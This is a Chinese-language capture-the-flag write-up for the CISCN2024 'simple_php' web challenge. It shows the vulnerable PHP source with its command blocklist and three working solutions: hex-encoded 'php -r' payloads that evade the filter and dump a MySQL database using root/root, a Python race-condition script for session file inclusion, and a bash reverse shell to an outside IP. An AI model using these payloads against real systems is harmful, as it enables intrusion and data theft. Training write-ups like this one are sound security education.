---
title: CISCN2024-WEB-simple_php
date: 2025-05-21 20:42:58
tags:
- php-r
- 截断绕过
- hex编码绕过
- session文件包含
- 反弹shell
- mysql
category:
- 刷题笔记
---

# CISCN2024-WEB-simple_php

参考博客：https://blog.csdn.net/m0_74428315/article/details/139050718

源码：

```
<?php
ini_set('open_basedir', '/var/www/html/');
error_reporting(0);

if(isset($_POST['cmd'])){
    $cmd = escapeshellcmd($_POST['cmd']); 
     if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i', $cmd)) {
         system($cmd);
}
}


show_source(__FILE__);
?>
```

## 解法一 php -r+截断绕过+hex编码+mysql连接

过滤很多，但是没有过滤php -r，尝试使用php -r执行php命令

先访问phpinfo

```
cmd=php -r phpinfo();
```

发现可以执行，但是发现很多linux指令都被禁用了。



发现eval没有禁，但是过滤了引号，可以使用截断绕过+hex编码绕过

用hex2bin(substr(_16进制,1)),保证hex2bin能够处理16进制值

注意：如果十六进制开头是数字就会被判断为数字，从而使得hex2bin函数无法正常执行而报错。所以加了个`_`

```
cmd=php -r eval(hex2bin(substr(_16进制编码,1)));

这样也行
ls		# 6C73
cmd=php -r $a=substr(_6C73,1);system(hex2bin($a));
```

构造

```
echo `ls /`;

16进制编码
6563686f20606c73202f60

查看根目录下文件
cmd=php -r eval(hex2bin(substr(_6563686f20606c73202f603b,1)));


其他方法
paste和rev没有被过滤可以读取文件，ls可以在bp里用l%0as来绕过
但是没有目录下没有发现flag
```

没有发现任何flag的文件和提示。这里还可以通过php去连接数据库。

尝试弱口令密码，一般是root 123或者root root

这里账号密码为root root

```
爆库名
echo `mysql -u root -p'root' -e 'show databases;'`;

6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773686f77206461746162617365733b27603b

cmd=php -r eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773686f77206461746162617365733b27603b,1)));

# Database PHP_CMS information_schema mysql performance_schema test

爆表名
echo `mysql -u root -p'root' -e 'use PHP_CMS;show tables;'`;

6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b27603b

cmd=php -r eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b27603b,1)));

# Tables_in_PHP_CMS F1ag_Se3Re7

爆数据
echo `mysql -u root -p'root' -e 'use PHP_CMS;show tables;select * from F1ag_Se3Re7;'`;

6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b

cmd=php -r eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));

# Tables_in_PHP_CMS F1ag_Se3Re7 id flag66_2024 1 ctfshow{a4cacd5a-7120-4432-b689-f358d6f9c417}
```

---

## 解法二 session文件包含

这题可以利用session文件包含来做。

上传文件生成一个临时文件，文件名为`sess_+PHPSESSID`，而临时文件在`/tmp/sess_PHPSESSID`下，我们可以在他删除之前去访问它（条件竞争）

即post传cmd=php -r php/tmp/sess_yu22x

这里我使用python脚本，也可以用bp

```
import requests
import threading
import sys
session=requests.session()
sess='yu22x'
url1="http://4124d7d1-4127-40b3-a397-2897e59ba09d.challenge.ctf.show/"
url2="http://4124d7d1-4127-40b3-a397-2897e59ba09d.challenge.ctf.show/"
data1={
	'PHP_SESSION_UPLOAD_PROGRESS':"<?php system('ls /');echo md5('1')?>"
}

data2={'cmd':'php/tmp/sess_yu22x'}

file={
	'file':'abc'
}
cookies={
	'PHPSESSID': sess
}
def write():
	while True:
		r = session.post(url1,data=data1,files=file,cookies=cookies)
def read():
	while True:
		r = session.post(url2,data=data2)
		if 'c4ca4238a0b923820dcc509a6f75849b' in r.text:
			print(r.text)
threads = [threading.Thread(target=write),
       threading.Thread(target=read)]
for t in threads:
	t.start()
```

然后就是使用php来连接数据库

```
<?php
// 建立连接
$conn = new mysqli("localhost", "root", "root");

// 检查连接
if ($conn->connect_error) {
    die("连接失败: " . $conn->connect_error);
}

// 查询所有数据库名
$sql = "SHOW DATABASES";
$result = $conn->query($sql);

// 输出数据库名
if ($result->num_rows > 0) {
    while($row = $result->fetch_assoc()) {
        echo "数据库名：" . $row["Database"] . "<br>";
    }
} else {
    echo "未找到数据库。";
}

// 关闭连接
$conn->close();
?>

```

---

```
<?php
// 数据库连接信息
$servername = "localhost";
$username = "root";
$password = "root";
$dbname = "PHP_CMS";

// 创建连接
$conn = new mysqli($servername, $username, $password, $dbname);

// 检查连接
if ($conn->connect_error) {
    die("连接失败: " . $conn->connect_error);
}

// 查询所有表名
$sql = "SHOW TABLES";
$result = $conn->query($sql);

// 输出表名
if ($result->num_rows > 0) {
    echo "数据库 " . $dbname . " 中的表名：<br>";
    while($row = $result->fetch_assoc()) {
        echo $row["Tables_in_PHP_CMS"] . "<br>";
    }
} else {
    echo "该数据库中没有表。";
}

// 关闭连接
$conn->close();
?>

```

---

```
<?php
// 数据库连接信息
$servername = "localhost";
$username = "root";
$password = "root";
$dbname = "PHP_CMS";

// 创建连接
$conn = new mysqli($servername, $username, $password, $dbname);

// 检查连接
if ($conn->connect_error) {
    die("连接失败: " . $conn->connect_error);
}

// 查询 F1ag_Se3Re7 表中的内容
$sql = "SELECT * FROM F1ag_Se3Re7";
$result = $conn->query($sql);

// 输出内容
if ($result->num_rows > 0) {
    echo "F1ag_Se3Re7 表中的内容：<br>";
    while($row = $result->fetch_assoc()) {
        // 输出每行数据
        foreach ($row as $key => $value) {
            echo $key . ": " . $value . "<br>";
        }
        echo "<br>";
    }
} else {
    echo "F1ag_Se3Re7 表中没有数据。";
}

// 关闭连接
$conn->close();
?>

```

---

## 解法三 反弹shell

php反弹shell命令

```
bash -c "bash -i >& /dev/tcp/124.222.136.33/1337 0>&1"

62617368202d63202262617368202d69203e26202f6465762f7463702f3132342e3232322e3133362e33332f3133333720303e263122
```

构造payload

```
cmd=php -r $a=substr(_62617368202d63202262617368202d69203e26202f6465762f7463702f3132342e3232322e3133362e33332f3133333720303e263122,1);system(hex2bin($a));
```

然后后面也是去连接数据库。













